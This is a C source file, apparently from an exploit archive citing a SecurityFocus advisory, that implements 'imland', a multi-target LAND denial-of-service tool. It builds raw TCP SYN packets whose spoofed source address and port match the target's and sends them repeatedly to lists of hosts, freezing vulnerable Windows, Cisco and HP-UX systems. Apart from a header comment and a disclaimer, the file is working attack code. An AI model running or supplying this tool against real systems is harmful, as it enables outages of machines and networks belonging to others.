/*
source: http://www.securityfocus.com/bid/2666/info

A number of TCP/IP stacks are vulnerable to a "loopback" condition initiated by sending a TCP SYN packet with the source address and port spoofed to equal the destination source and port. When a packet of this sort is received, an infinite loop is initiated and the affected system halts. This is known to affect Windows 95, Windows NT 4.0 up to SP3, Windows Server 2003, Windows XP SP2, Cisco IOS devices & Catalyst switches, and HP-UX up to 11.00.

It is noted that on Windows Server 2003 and XP SP2, the TCP and IP checksums must be correct to trigger the issue.

**Update: It is reported that Microsoft platforms are also prone to this vulnerability. The vendor reports that network routers may not route malformed TCP/IP packets used to exploit this issue. As a result, an attacker may have to discover a suitable route to a target computer, or reside on the target network segment itself before exploitation is possible. 
*/

/*
 * imland - improved multiple land
 *
 * A good spanking session requires several good, hard slaps.
 *
 * This program lands multiple land attacks on multiple hosts as a
 * proof of concept of the oldly discovered but newly resurfaced
 * M$ `land' attack vulnerability. It was written without ill intent to
 * test a large range of servers for vulnerabilities in one go.
 *
 * If the targeted machines freeze up for 5-30 seconds for each packet,
 * that means they are vulnerable.
 *
 * Disclaimer:
 * This program was written without ill intent. It was designed to test
 * and prove the effects of the LAND attack on multiple hosts at once.
 * I am in no way responsible for what you do with this piece of code.
 *
 * Please use it responsibly to test your own servers only.
 *
 */

#define _BSD_SOURCE
#define __FAVOR_BSD

#include <stdio.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


/* the attack packet */
struct raw_tcp_packet {
	struct ip ip;
	struct tcphdr tcp;
};

/* required to make the TCP checksum correct */
struct tcp_chksum_hdr {
	struct in_addr src;
	struct in_addr dest;
	u_char zero;
	u_char proto;
	u_short len;
	struct tcphdr tcp;
};

/* linked list with all we need, really */
typedef struct target {
	struct sockaddr_in sa;
	struct {
		struct iphdr ip;    /* included here so we can build them once */
		struct tcphdr tcp;  /* and thus transmit a tiny bit faster */
	} pkt;
	struct target *next;
} target;

/** prototypes **/
int send_land(int, struct target *);
void u_sleep(u_int);
int add_target_ip(char *, struct in_addr *, u_short);
u_int get_timevar(const char *);
int add_target(char *);
unsigned short chksum(unsigned short *, int);
void finish(int);
void crash(const char *, ...);
void usage(void);

/** external **/
extern int optind, opterr, optopt;
extern int h_errno;
extern char *optarg;
extern char *__progname;

/** global variables **/
target *list = NULL, *cursor = NULL;
int targets = 0;
int pkt_interval = 0; /* no delay by default */
int pkts = 1, pkts_sent = 0;  /* send one per host by default */
int debug = 0;
u_short defport = 139; /* default port */

/** code start **/
void crash(const char *fmt, ...)
{
	va_list ap;

	printf("%s: ", __progname);

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);

	if(errno) printf(": %s", strerror(errno));
	puts("");

	exit(3);
}

int main(int argc, char **argv)
{
	target *host;
	int sock, foo;

	if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
		crash("socket()");

	while((foo = getopt(argc, argv, "v:i:p:n:")) != EOF) {
		switch(foo) {
		case 'v':
			debug++;
			break;
		case 'i':
			pkt_interval = get_timevar(optarg);
			break;
		case 'p':
			defport = (u_short)strtoul(optarg, NULL, 0);
			break;
		case 'n':
			pkts = strtoul(optarg, NULL, 0);
			if(debug) printf("Sending %d packets\n", pkts);
			break;
		default:
			add_target(optarg);
			break;
		}
	}

	argv = &argv[optind];
	while(*argv) {
		add_target(*argv);
		argv++;
	}
	
	if(!targets) usage();

	while(!pkts || pkts > pkts_sent) {
		host = list;
		while(host) {
			printf("Sending to %s:%u ... ",
				   inet_ntoa(host->sa.sin_addr),
				   host->sa.sin_port);
			foo = send_land(sock, host);
			if(foo == - 1) printf("failed - %s\n", strerror(errno));
			else printf("ok, landed %d bytes\n", foo);

			if(pkt_interval) u_sleep(pkt_interval);

			host = host->next;
		}
		pkts_sent++;
	}

	return 0;
}

/* build and send the land attack packet */
int send_land(int sock, struct target *host)
{
	struct raw_tcp_packet pkt;
	struct tcp_chksum_hdr tcc;

	memset(&pkt, 0, sizeof(pkt));
	memset(&tcc, 0, sizeof(tcc));

	/* ip options */
	pkt.ip.ip_v = IPVERSION;
	pkt.ip.ip_hl = sizeof(struct iphdr) / 4;
	pkt.ip.ip_tos = 0;
	pkt.ip.ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr));
	pkt.ip.ip_off = htons(IP_DF);
	pkt.ip.ip_ttl = 0xff;
	pkt.ip.ip_p = IPPROTO_TCP;
	pkt.ip.ip_src = pkt.ip.ip_dst = host->sa.sin_addr;
	pkt.ip.ip_sum = chksum((u_short *)&pkt.ip, sizeof(struct iphdr));

	tcc.src = tcc.dest = host->sa.sin_addr;
	tcc.zero = 0;
	tcc.proto = IPPROTO_TCP;
	tcc.len = htons(sizeof(struct tcphdr));

	tcc.tcp.th_sport = tcc.tcp.th_dport = htons(host->sa.sin_port);
	tcc.tcp.th_seq = htons(0x1d1);
	tcc.tcp.th_off = sizeof(struct ip) / 4;
	tcc.tcp.th_flags = TH_SYN;
	tcc.tcp.th_win = htons(512);

	memcpy(&pkt.tcp, &tcc.tcp, sizeof(struct tcphdr));
	pkt.tcp.th_sum = chksum((u_short *)&tcc, sizeof(tcc));
	return sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&host->sa,
				  sizeof(struct sockaddr_in));
}

/* calculate checksum */
u_short chksum(u_short *p, int n)
{
	register long sum = 0;

	while(n > 1) {
		sum += *p++;
		n -= 2;
	}
	/* mop up the occasional odd byte */
	if(n == 1) sum += *(u_char *)p;

	sum = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum = sum + (sum >> 16);            /* add carry */
	return ~sum;                        /* ones-complement, truncate */
}

/* usleep() the portable way. No error checking is done,
 * so this might theoretically fail. */
void u_sleep(u_int u_sec)
{
	struct timeval to;
	fd_set readset, writeset;

	if(debug > 3) printf("sleeping for %u microseconds\n", u_sec);
	if(!u_sec) return;

	to.tv_sec = u_sec / 1000000;
	to.tv_usec = u_sec % 1000000;
	FD_ZERO(&writeset);
	FD_ZERO(&readset);
	select(0, &readset, &writeset, NULL, &to);

	return;
}

int add_target_ip(char *arg, struct in_addr *in, u_short port)
{
	struct target *host;

	/* disregard obviously stupid addresses */
	if(in->s_addr == INADDR_NONE || in->s_addr == INADDR_ANY)
		return -1;

	if(debug) printf("Adding %s:%u to target list\n", inet_ntoa(*in), port);

	/* add the fresh ip */
	host = malloc(sizeof(struct target));
	if(!host) {
		crash("add_target_ip(%s, %s): malloc(%d) failed",
			  arg, inet_ntoa(*in), sizeof(struct target));
	}
	memset(host, 0, sizeof(struct target));

	/* fill out the sockaddr_in struct */
	host->sa.sin_family = AF_INET;
	host->sa.sin_addr.s_addr = in->s_addr;
	host->sa.sin_port = port ? port : defport;

	if(!list) list = host;
	else cursor->next = host;

	cursor = host;
	targets++;

	return 0;
}

/* wrapper for add_target_ip to resolve stuff as well */
int add_target(char *arg)
{
	int i;
	struct hostent *he;
	struct in_addr *in, ip;
	char *port_str;
	u_short port = 0;

	if(!arg) return -1;
	
	if((port_str = strchr(arg, ':'))) {
		*port_str = '\0';
		port_str++;
		if(*port_str) port = (u_short)strtoul(port_str, NULL, 0);
	}

	/* don't resolve if we don't have to */
	if(inet_aton(arg, &ip)) return add_target_ip(arg, &ip, port);

	/* not an IP, so resolve */
	errno = 0;
	he = gethostbyname(arg);
	if(!he && h_errno == TRY_AGAIN) {
		u_sleep(500000);
		he = gethostbyname(arg);
	}

	if(!he) crash("Failed to resolve %s: %s", arg, hstrerror(h_errno));

	/* add all the IP's as targets */
	for(i = 0; he->h_addr_list[i]; i++) {
		in = (struct in_addr *)he->h_addr_list[i];
		add_target_ip(arg, in, port);
	}

	return 0;
}

/*
 * u = micro
 * m = milli
 * s = seconds
 * return value is in microseconds
 */
u_int get_timevar(const char *str)
{
	char p, u, *ptr;
	unsigned int len;
	u_int i, d;	            /* integer and decimal, respectively */
	u_int factor = 1000;    /* default to milliseconds */

	if(!str) return 0;
	len = strlen(str);
	if(!len) return 0;

	/* unit might be given as ms|m (millisec),
	 * us|u (microsec) or just plain s, for seconds */
	u = p = '\0';
	u = str[len - 1];
	if(len >= 2 && !isdigit((int)str[len - 2])) p = str[len - 2];
	if(p && u == 's') u = p;
	else if(!p) p = u;
	if(debug > 3) printf("evaluating %s, u: %c, p: %c\n", str, u, p);

	if(u == 'u') factor = 1;            /* microseconds */
	else if(u == 'm') factor = 1000;	/* milliseconds */
	else if(u == 's') factor = 1000000;	/* seconds */
	if(debug > 3) printf("factor is %u\n", factor);

	i = strtoul(str, &ptr, 0);
	if(!ptr || *ptr != '.' || strlen(ptr) < 2 || factor == 1)
		return i * factor;

	/* time specified in usecs can't have decimal points, so ignore them */
	if(factor == 1) return i;

	d = strtoul(ptr + 1, NULL, 0);

	/* d is decimal, so get rid of excess baggage */
	while(d >= factor) d /= 10;

	/* the last parenthesis avoids floating point exceptions. */
	return ((i * factor) + (d * (factor / 10)));
}

void usage(void)
{
	printf("Usage: %s -i <interval> -p <port> -n <pkts> host1:port1 hostn:portn\n\n",
		   __progname);

	printf("-i sets packet interval in milliseconds.\n");
	printf("   You can specify Nus for N microseconds, or Ns for N seconds.\n");
	printf("   Default is 0, which is good for multiple hosts and one packet.\n");
	printf("   If you want to send continuously, specify 1s or more, so as to not\n");
	printf("   cause DoS due to sheer traffic volume.\n\n");
	printf("-p sets the DEFAULT port (139 if not specified)\n\n");
	printf("-n determines how many packets to send to each target. Default is 1\n\n");
	printf("host:port combinations can be given as such; 207.46.130.108:80\n");
	printf("The port part of a target definition ovverrides the defaults.\n\n");
	printf("Hostnames will be resolved, if possible.\n");

	exit(1);
}